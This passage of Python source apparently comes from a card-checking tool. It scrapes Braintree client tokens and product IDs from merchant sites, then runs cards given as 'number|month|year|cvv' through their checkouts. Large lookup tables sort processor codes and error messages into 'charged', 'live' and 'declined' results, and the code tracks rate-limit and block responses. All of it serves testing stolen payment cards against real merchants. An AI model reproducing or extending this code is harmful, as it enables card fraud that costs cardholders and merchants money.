                break

        if pm_id:
            new_settings["payment_method_id"] = pm_id
        else:
            new_settings["payment_method_id"] = old_settings.get("payment_method_id", "3")
            results["auto_detected"].append(f"Payment method: {new_settings['payment_method_id']} (default)")

        product_patterns = [
            r'"variant_id"\s*:\s*(\d+)',
            r'"variantId"\s*:\s*(\d+)',
            r'data-variant-id=["\'](\d+)["\']',
            r'"id"\s*:\s*(\d+)[^}]*"product_id"',
        ]
        for pat in product_patterns:
            m = re.search(pat, home_html)
            if m:
                vid = m.group(1)
                new_settings["product_payload"] = json.dumps({"variant_id": int(vid), "quantity": 1})
                results["auto_detected"].append(f"Product variant: {vid}")
                break

        has_braintree = (
            'braintree' in home_html.lower()
            or bt_token is not None
            or 'braintree-api' in home_html.lower()
            or 'braintree.js' in home_html.lower()
        )

        if has_braintree:
            results["success"] = True
            for k, v in new_settings.items():
                _set_gs("braintree", k, v)
            results["auto_detected"].append("Braintree integration: confirmed")
        else:
            results["errors"].append("No Braintree integration detected on this site")
            results["success"] = True
            for k, v in new_settings.items():
                _set_gs("braintree", k, v)

    except Exception as e:
        results["errors"].append(f"Setup error: {str(e)[:80]}")
    finally:
        try:
            s.close()
        except Exception:
            pass

    return results


def _extract_bt_token(text):
    patterns = [
        r'braintreeClientToken":"([^"]+)"',
        r'braintree_client_token":"([^"]+)"',
        r'"clientToken":"([^"]+)"',
        r'"client_token":"([^"]+)"',
        r'"braintree_token"\s*:\s*"([^"]+)"',
        r'data-braintree-token="([^"]+)"',
        r"braintree_client_token'\s*:\s*'([^']+)'",
        r'"payment_client_token"\s*:\s*"([^"]+)"',
        r'"bt_client_token"\s*:\s*"([^"]+)"',
        r'clientToken\s*=\s*["\']([^"\']+)["\']',
    ]
    for pat in patterns:
        m = re.search(pat, text)
        if m:
            token = m.group(1)
            token = token.replace('\\u003d', '=').replace('\\/', '/').replace('\\n', '')
            if len(token) > 20:
                return token
    return None


_BT_RESPONSE_CODES = {
    "2000": ("declined", "Do Not Honor"),
    "2001": ("live", "Insufficient Funds (Live)"),
    "2002": ("live", "Limit Exceeded (Live)"),
    "2003": ("live", "Activity Limit (Live)"),
    "2004": ("declined", "Expired Card"),
    "2005": ("declined", "Invalid Card Number"),
    "2006": ("declined", "Invalid Expiry"),
    "2007": ("declined", "No Account"),
    "2008": ("declined", "Card Account Length Error"),
    "2009": ("declined", "No Such Issuer"),
    "2010": ("live", "CVV Mismatch (Card Live)"),
    "2011": ("declined", "Voice Authorization Required"),
    "2012": ("declined", "Processor Declined - Hold"),
    "2013": ("declined", "Processor Declined"),
    "2014": ("declined", "Processor Declined"),
    "2015": ("declined", "Transaction Not Allowed"),
    "2016": ("declined", "Duplicate Transaction"),
    "2017": ("declined", "Cardholder Cancelled Recurring"),
    "2018": ("declined", "Cardholder Cancelled All Recurring"),
    "2019": ("declined", "Invalid Transaction"),
    "2020": ("declined", "Violation"),
    "2021": ("declined", "Security Violation"),
    "2022": ("declined", "Declined - Updated Info Available"),
    "2023": ("declined", "Transaction Not Supported"),
    "2024": ("declined", "Card Type Not Enabled"),
    "2025": ("declined", "Set Up Error - Merchant"),
    "2026": ("declined", "Currency Not Supported"),
    "2027": ("declined", "Set Up Error - Amount"),
    "2028": ("declined", "Set Up Error - Hierarchy"),
    "2029": ("declined", "Set Up Error - Card"),
    "2030": ("declined", "Set Up Error - Terminal"),
    "2031": ("declined", "Encryption Error"),
    "2032": ("declined", "Surcharge Not Permitted"),
    "2033": ("declined", "Inconsistent Data"),
    "2034": ("declined", "No Action Taken"),
    "2035": ("declined", "Partial Approval"),
    "2036": ("declined", "Processor Declined - Auth Error"),
    "2037": ("declined", "Already Reversed"),
    "2038": ("declined", "Processor Declined"),
    "2039": ("declined", "Invalid Auth Code"),
    "2040": ("declined", "Invalid Store"),
    "2041": ("declined", "Declined - Call For Approval"),
    "2042": ("declined", "Invalid Client ID"),
    "2043": ("declined", "Error - Do Not Retry"),
    "2044": ("declined", "Declined - Call Issuer"),
    "2045": ("declined", "Invalid Merchant Number"),
    "2046": ("declined", "Declined"),
    "2047": ("declined", "Call Issuer"),
    "2048": ("declined", "Invalid Amount"),
    "2049": ("declined", "Invalid SKU Number"),
    "2050": ("declined", "Invalid Credit Plan"),
    "2051": ("declined", "Credit Card Number Invalid"),
    "2053": ("declined", "Card Reported Stolen"),
    "2054": ("declined", "Card Reported Lost"),
    "2055": ("declined", "Invalid PIN"),
    "2056": ("declined", "No Card Record"),
    "2057": ("declined", "Issuer/Cardholder Declined"),
    "2058": ("declined", "Transaction Not Permitted"),
    "2059": ("declined", "Suspected Fraud"),
    "2060": ("declined", "Security Violation"),
    "2061": ("live", "AVS Mismatch (Card Live)"),
    "2062": ("declined", "Invalid Branch"),
    "2063": ("declined", "Invalid Account Type"),
    "2064": ("declined", "Negative Info on File"),
    "2065": ("declined", "Withdrawal Limit Exceeded"),
    "2066": ("declined", "Issuer or Cardholder Restriction"),
    "2067": ("declined", "Hard Decline - No Retry"),
    "2068": ("declined", "Amount Exceeds Limit"),
    "2069": ("live", "PayPal Pending (Live)"),
    "2070": ("declined", "PayPal Business Validation"),
    "2071": ("declined", "PayPal Domestic Only"),
    "2072": ("declined", "PayPal Not Allowed For This Gateway"),
    "2073": ("declined", "PayPal Flagged For Review"),
    "2074": ("declined", "Funding Instrument In Pending State"),
    "2075": ("declined", "Payer Account Locked or Closed"),
    "2076": ("declined", "PayPal Approval Required"),
    "2077": ("declined", "Funding Source Not Available"),
    "2078": ("declined", "PayPal Account Restricted"),
    "2079": ("live", "PayPal Needs Consent (Live)"),
    "2080": ("declined", "PayPal Denied"),
    "2081": ("declined", "Refund Time Limit"),
    "2082": ("declined", "PIN Tries Exceeded"),
    "2083": ("declined", "PIN Capture Required"),
    "2084": ("declined", "No Interac Debit Account"),
    "2085": ("declined", "Cash Back Limit Exceeded"),
    "2086": ("declined", "Invalid Auth for Cash Back"),
    "2087": ("declined", "Cash Back Service Not Available"),
    "2088": ("declined", "Cash Back Request Exceeds Limit"),
    "2089": ("declined", "Invalid Debit Account Number"),
    "2090": ("live", "AVS Address Required (Card Live)"),
    "2091": ("declined", "Data Error"),
    "2092": ("declined", "Card Not Activated"),
    "2093": ("declined", "PayPal Region Restricted"),
    "81706": ("declined", "Invalid CVV"),
    "81707": ("declined", "CVV Required"),
    "81709": ("declined", "Invalid Expiry Month"),
    "81710": ("declined", "Invalid Expiry Year"),
    "81714": ("declined", "Card Already Expired"),
    "81725": ("declined", "Invalid Card Number"),
}

_LIVE_SIGNALS = [
    "card issuer declined cvv", "cvv2", "cvv verification",
    "incorrect cid", "security code verification", "cvc check failed",
    "avs mismatch", "address verification", "postal code check failed",
    "insufficient funds", "insufficient_funds",
    "card_velocity_exceeded", "activity limit",
    "withdrawal_count_limit_exceeded", "limit exceeded",
    "approve_with_id", "approved with id",
]

_3DS_SIGNALS = [
    "3d secure", "3ds", "authentication required", "requires_action",
    "enrolled for verification", "cardholder enrolled", "sca_required",
    "three_d_secure", "3d_secure_required",
]

_HARD_DECLINE_MAP = {
    "do not honor": "Do Not Honor",
    "do_not_honor": "Do Not Honor",
    "expired card": "Expired Card",
    "expired_card": "Expired Card",
    "lost card": "Card Reported Lost",
    "lost_card": "Card Reported Lost",
    "stolen card": "Card Reported Stolen",
    "stolen_card": "Card Reported Stolen",
    "pick up card": "Pick Up Card",
    "pickup_card": "Pick Up Card",
    "restricted card": "Restricted Card",
    "restricted_card": "Restricted Card",
    "your card was declined": "Card Declined",
    "card is not accepted": "Card Not Accepted",
    "processor declined": "Processor Declined",
    "invalid card number": "Invalid Card Number",
    "incorrect_number": "Invalid Card Number",
    "card number does not match": "Card Number Mismatch",
    "transaction not allowed": "Transaction Not Allowed",
    "transaction_not_allowed": "Transaction Not Allowed",
    "not_permitted": "Transaction Not Permitted",
    "card not activated": "Card Not Activated",
    "invalid expiration": "Invalid Expiry",
    "invalid_expiry": "Invalid Expiry",
    "no such issuer": "No Such Issuer",
    "suspected fraud": "Suspected Fraud",
    "fraudulent": "Fraud Suspected",
    "security violation": "Security Violation",
    "security_violation": "Security Violation",
    "generic_decline": "Card Declined",
    "card_declined": "Card Declined",
    "testmode_decline": "Test Mode Decline",
    "live_mode_test_card": "Test Card Rejected",
    "currency_not_supported": "Currency Not Supported",
    "invalid_account": "Invalid Account",
    "gateway rejected: risk_threshold": "Gateway Risk Rejected",
    "gateway rejected: risk": "Gateway Risk Rejected",
    "gateway rejected: avs": "Gateway AVS Rejected",
    "gateway rejected: cvv": "Gateway CVV Rejected",
    "gateway rejected: duplicate": "Gateway Duplicate Rejected",
    "gateway rejected: fraud": "Gateway Fraud Rejected",
    "gateway_rejected": "Gateway Rejected",
    "call_issuer": "Call Issuer",
    "issuer_not_available": "Call Issuer",
    "reenter_transaction": "Processor Declined",
    "no_action_taken": "Card Declined",
    "incorrect_zip": "Declined - AVS",
    "your card number is incorrect": "Invalid Card Number",
    "card number is incorrect": "Invalid Card Number",
    "exceeds withdrawal amount": "Exceeds Withdrawal Limit",
    "exceeds approval amount": "Exceeds Approval Limit",
}


def _extract_all_errors(res_text, js):
    parts = []

    base_match = re.search(r'base":\s*\["([^"]+)"', res_text)
    if base_match:
        parts.append(base_match.group(1))

    base_arr = re.findall(r'base":\s*\["([^"]+)"', res_text)
    for b in base_arr:
        if b not in parts:
            parts.append(b)

    if isinstance(js, dict):
        err_field = js.get('error', '')
        if isinstance(err_field, str) and err_field:
            parts.append(err_field)
        elif isinstance(err_field, dict):
            m = err_field.get('message', '')
            if m:
                parts.append(m)

        errors_obj = js.get('errors', {})
        if isinstance(errors_obj, dict):
            for key, val in errors_obj.items():
                if isinstance(val, list):
                    for v in val:
                        if isinstance(v, str) and v not in parts:
                            parts.append(v)
                elif isinstance(val, str) and val not in parts:
                    parts.append(val)
        elif isinstance(errors_obj, list):
            for e in errors_obj:
                if isinstance(e, str) and e not in parts:
                    parts.append(e)

    return parts


def _parse_braintree_result(res_text, cc, mes, ano, cvv, brand_code=""):
    if not res_text:
        return _error_result(cc, mes, ano, cvv, "Empty payment response")

    card_str = f"{cc}|{mes}|{ano}|{cvv}"
    res_lower = res_text.lower()

    try:
        js = json.loads(res_text)
    except Exception:
        js = {}

    order_state = ""
    current_step = ""
    payment_state = ""
    if isinstance(js, dict):
        current_step = str(js.get('currentStep', ''))
        order_obj = js.get('order', {})
        if isinstance(order_obj, dict):
            order_state = str(order_obj.get('state', ''))
            payment_state = str(order_obj.get('payment_state', ''))
        elif isinstance(js.get('state', ''), str):
            order_state = js.get('state', '')

    if order_state == 'complete' or payment_state == 'paid':
        return {'status': 'charged', 'detail': 'Approved - Payment Processed', 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}

    if order_state == 'confirm' or current_step == 'confirmation':
        return {'status': 'charged', 'detail': 'Approved - Reached Confirmation', 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}

    error_parts = _extract_all_errors(res_text, js)
    all_err = " ".join(error_parts).lower()
    primary_err = error_parts[0] if error_parts else ""

    if order_state == 'payment' or current_step == 'payment':
        if not all_err:
            return {'status': 'charged', 'detail': 'Approved - Payment Accepted', 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}

    code_match = re.search(r'"code"\s*:\s*"?(\d{4,5})"?', res_text)
    if code_match:
        code_val = code_match.group(1)
        if code_val in _BT_RESPONSE_CODES:
            status, detail = _BT_RESPONSE_CODES[code_val]
            return {'status': status, 'detail': detail, 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}

    processor_code = re.search(r'"processorResponseCode"\s*:\s*"?(\d{4,5})"?', res_text)
    if processor_code:
        pcode = processor_code.group(1)
        if pcode in _BT_RESPONSE_CODES:
            status, detail = _BT_RESPONSE_CODES[pcode]
            return {'status': status, 'detail': detail, 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}

    if brand_code and brand_code.lower() in ('mastercard', 'master-card', 'master_card'):
        if "issuer or cardholder has put a restriction" in all_err or "restriction" in all_err:
            return {'status': 'live', 'detail': 'Master Restriction (Card Live)', 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}

    for sig in _3DS_SIGNALS:
        if sig in all_err or sig in res_lower:
            return {'status': 'live', 'detail': '3DS Required (Card Live)', 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}

    for sig in _LIVE_SIGNALS:
        if sig in all_err:
            if "insufficient" in sig:
                return {'status': 'live', 'detail': 'Insufficient Funds (Live)', 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}
            elif "velocity" in sig or "activity" in sig or "limit" in sig:
                return {'status': 'live', 'detail': 'Activity Limit (Live)', 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}
            elif "approve" in sig:
                return {'status': 'live', 'detail': 'Approved with ID (Live)', 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}
            else:
                detail = f'CVV Declined (Card Live) - {primary_err[:40]}' if primary_err else 'CVV Declined (Card Live)'
                return {'status': 'live', 'detail': detail, 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}

    for pattern, detail in _HARD_DECLINE_MAP.items():
        if pattern in all_err or pattern in res_lower:
            return {'status': 'declined', 'detail': detail, 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}

    if primary_err:
        clean = re.sub(r'<[^<]+?>', '', primary_err).strip()
        return {'status': 'declined', 'detail': clean[:60] or 'Card Declined', 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}

    if _is_ban_signal(res_text):
        return {'status': 'error', 'detail': 'Rate Limited / Blocked', 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}

    return {'status': 'declined', 'detail': 'Card Declined', 'gate': 'Braintree', 'card': card_str, 'brand': brand_code}
